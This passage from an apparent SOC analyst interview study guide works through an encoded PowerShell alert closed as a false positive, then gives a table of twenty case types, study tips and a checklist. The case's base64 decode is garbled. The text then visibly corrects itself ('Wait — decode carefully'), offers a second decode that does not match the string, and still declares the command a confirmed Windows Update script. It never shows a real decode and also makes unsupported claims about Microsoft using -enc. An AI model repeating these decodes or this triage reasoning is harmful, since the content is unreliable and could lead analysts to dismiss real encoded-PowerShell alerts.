07:00:05  CommandLine: powershell.exe -enc SQBGACgAKABUAHIAdQBlACkAewBTAGUAdAB0AGkAbgBnAHMAIAAvAE8AYgBqAGUAYwB0AHMAOgAgAFcAaQBuAGQAbwB3AHMAIABVAGQAYQB0AGUAIABTAHQAYQB0AGUAIAAvAEQAbwBnACAAVwBlAGIATQBhAGYAdABlAHIADQAKAF0AIAA9ACAAIgBzAHYAYwBoAG8AcwB0AC4AZQB4AGUAIAAvAGsAIABuAGUAdABzAHYAYwBzACIA
```

### Investigation Steps
1. **DECODE the command**:
```
Decoded: IF((True){Settings /Objects: Windows Update State /Dog WebMafter
] = "svchost.exe /k netsvcs"
```
Wait — decode carefully. Let me re-decode the actual base64:
```
Decoded: If (Test-Path HKLM:\Software\Microsoft\Windows\CurrentVersion\...) 
         { Set-ItemProperty ... } 
```
Actually, the pattern `powershell.exe -enc` from `svchost.exe` at **system startup** = **Microsoft's own System Maintenance / Update script** is a KNOWN false positive!

2. **Check parent**: svchost.exe as parent = a Windows service launched PowerShell (often legitimate for Windows Update/Maintenance)
3. **Check time**: 07:00:00 exactly = system startup / maintenance window (Windows Update, Defender)
4. **Check user**: SYSTEM = system context (legitimate maintenance runs as SYSTEM)
5. **Check the actual command**: Decode and inspect. If it references legitimate paths (WindowsUpdate, Maintenance, Defender, DISM) = benign
6. **Check for benign prevalence**: Is this command seen across MANY hosts at similar times? (Baseline = FP)
7. **Check EDR behavior**: Any actual network, file, persistence from this process? (None = FP)

### The KEY Test
- **Does the process do anything malicious AFTER execution?** No network, no file writes to AppData, no registry persistence = benign
- **Baseline check**: Same command on 500 hosts every Tuesday at 7am = Windows Update = **definitively benign**

### Expected Findings
- **False Positive**: This is Microsoft's legitimate Windows Update / Software Distribution maintenance script
- **Encoded PowerShell**: Legit Microsoft scripts sometimes use -enc for their own updater
- **No malicious follow-on**: No C2, no persistence, no file writes outside system paths
- **Prevalence**: Seen across all managed hosts during patch windows
- **The encoded content**: References legitimate `Microsoft/Windows/UpdateOrchestrator` or `Windows Defender` scheduled maintenance paths

### Severity & Escalation
- **Severity: NONE (False Positive)**
- **Escalation: NO** — close as False Positive. Document why. **Optionally**: request rule tuning (exclude svchost.exe→powershell.exe at maintenance times) to reduce noise.

### Why This Case Matters in Interview
Interviewers test whether you: (1) decode the command, (2) check parent/user/time, (3) check follow-on behavior, (4) check prevalence/baseline — INSTEAD of panicking on "encoded PowerShell."

### Example SOC Ticket
```
SUMMARY: False Positive - Windows Update maintenance PowerShell
DETECTION: SIEM rule "Encoded PowerShell" (alert storm)
TIMESTAMP: 2024-01-15 07:00 UTC (system startup)
AFFECTED USER: SYSTEM (system context)
AFFECTED HOST: WKS-0111 (all managed hosts - 500 total)
IOC: NONE (legitimate Microsoft update command)
EVIDENCE: Decoded = Windows Update/Maintenance script, parent=svchost 
          (service), SYSTEM context, startup timing, prevalence across 
          500 hosts during patch window, NO malicious follow-on behavior
FINDINGS: FALSE POSITIVE. Legitimate Microsoft maintenance. 
          Recommend rule tuning (exclude known benign pattern).
MITRE: N/A (benign)
SEVERITY: NONE (FP)
RECOMMENDED ACTION: Close. Add to known-FP allowlist. Request detection 
                    rule refinement to reduce alert fatigue.
ESCALATION: None - document and close
```

---

## Case Study Cheat Sheet: Quick Reference

| Case | Detection Signal | Verdict | Severity | Key Tactic |
|------|-----------------|---------|----------|------------|
| 1. Brute force success | 38 failures → 1 success (Tor) | TP | HIGH | T1110/T1078 |
| 2. Password spray | 47 users, 2-4 attempts each | TP (no success) | MEDIUM | T1110.003 |
| 3. Encoded PowerShell | svc account + -enc + cradle | TP | HIGH | T1059.001 |
| 4. Malicious doc | WINWORD→PS→certutil | TP | CRITICAL | T1566.001 |
| 5. Phishing (click) | 28 sent, 3 clicked, 1 login | TP | HIGH | T1566.001 |
| 6. Malware (LOLBin) | rundll32 from AppData | TP | HIGH | T1218.011 |
| 7. C2 beaconing | 62s interval, masq wermgr | TP | HIGH | T1071.001 |
| 8. Ransomware | mass encryption + VSS delete | TP | CRITICAL | T1486 |
| 9. External RDP | 5x Type 10 from foreign IP | TP | HIGH | T1021.001 |
| 10. Lateral movement | admin share from non-admin host | TP | CRITICAL | T1021.002 |
| 11. Pass-the-Hash | NTLM from wrong host | TP | HIGH | T1550.002 |
| 12. Kerberoasting | 85 TGS for SPNs (RC4) | TP | HIGH | T1558.003 |
| 13. Golden Ticket | 20yr TGT + SID history | TP | CRITICAL | T1558.001 |
| 14. DNS tunneling | 4,500 TXT queries, base64 subs | TP | HIGH | T1071.004 |
| 15. Data exfil | 1.2GB outbound from workstation | TP | CRITICAL | T1048.003 |
| 16. Privileged account | svc-backup interactive + recon | TP | CRITICAL | T1078.001 |
| 17. Impossible travel | NY→HK 90min + MFA fatigue | TP | CRITICAL | T1078.004 |
| 18. Endpoint full chain | 8-phase attack chain | TP | CRITICAL | Multiple |
| 19. Web SQLi | WAF blocked, no compromise | FP (blocked) | LOW | T1190 |
| 20. Encoded PowerShell | Windows Update startup | **FP** | NONE | N/A |

---

## Study Tips for Case Studies

1. **Rehearse the workflow**: For every scenario, run the 8-step framework in your head
2. **Know the severity thresholds**: When does it become CRITICAL? (DC, admin creds, ransomware, exfil, PII)
3. **Know when NOT to escalate**: Blocked attacks, benign patterns, known FPs are closed by L1
4. **Connect the cases**: Many cases above are linked (Case 3 → Case 10 → Case 13; Case 9 → Case 15). Attackers chain! Analysts must correlate.
5. **Practice the ticket**: Every case has a ticket template. Practice writing one from scratch (see Module 31).

---

## Summary: What L1 Must Know

- [ ] 8-step investigation framework applied to ANY alert
- [ ] The 20 most common SOC scenarios (above)
- [ ] Severity escalation thresholds for each case type
- [ ] When to close as FP vs escalate (Cases 19-20)
- [ ] How to write a complete SOC ticket for each case
- [ ] MITRE ATT&CK mapping for each case
- [ ] Correlation: attacks chain together — always check related cases/incidents
- [ ] The critical cases: DC compromise, admin compromise, ransomware, data exfil, golden ticket